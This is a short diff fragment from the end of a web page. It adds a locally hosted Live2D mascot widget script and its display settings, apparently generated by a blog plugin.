+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":90,"height":200},"mobile":{"show":true},"log":false});</script></body>
+</html>
